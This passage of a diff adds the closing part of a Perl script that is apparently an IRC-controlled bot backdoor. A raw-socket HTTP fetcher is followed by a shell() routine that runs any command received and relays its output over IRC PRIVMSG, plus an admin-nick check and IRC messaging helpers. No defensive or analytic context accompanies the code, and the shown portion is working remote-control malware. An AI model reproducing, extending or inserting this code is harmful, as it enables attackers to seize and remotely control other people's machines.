+	my $host = $url;
+	my $query = $url;
+	my $page  = "";
+	$host =~ s/href=\"?http:\/\///;
+	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
+	$query =~ s/$host//;
+	if ($query eq "") { $query = "/"; }
+		eval {
+			my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
+			my $sget = "GET $query HTTP/1.0\r\n";
+			$sget .= "Host: $host\r\n";
+			$sget .= "Accept: */*\r\n";
+			$sget .= "User-Agent: $uagent\r\n";
+			$sget .= "Connetion: Close\r\n\r\n";
+			print $sock $sget;
+			my @pages = <$sock>;
+			$page = "@pages";
+			close($sock);
+		};
+    return $page;
+}
+
+#########################################
+
+sub shell() {
+    my $path = $_[0];
+    my $cmd = $_[1];
+    if ($cmd =~ /cd (.*)/) {
+        chdir("$1") || &msg("$path","No such file or directory");
+        return;
+    }
+    elsif ($pid = fork) { waitpid($pid, 0); }
+    else { if (fork) { exit; } else {
+        my @output = `$cmd 2>&1 3>&1`;
+        my $c = 0;
+        foreach my $output (@output) {
+            $c++;
+            chop $output;
+            &msg("$path","$output");
+            if ($c == 5) { $c = 0; sleep 3; }
+        }
+        exit;
+    }}
+}
+
+sub isAdmin() {
+    my $status = 0;
+    my $nick = $_[0];
+    if ($nick eq $admin) { $status = 1; }
+    return $status;
+}
+
+sub msg() {
+    return unless $#_ == 1;
+    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
+}
+
+sub nick() {
+    return unless $#_ == 0;
+    sendraw("NICK $_[0]");
+}
+sub notice() {
+    return unless $#_ == 1;
+    sendraw("NOTICE $_[0] :$_[1]");
+}
+
+
+
+#EOF
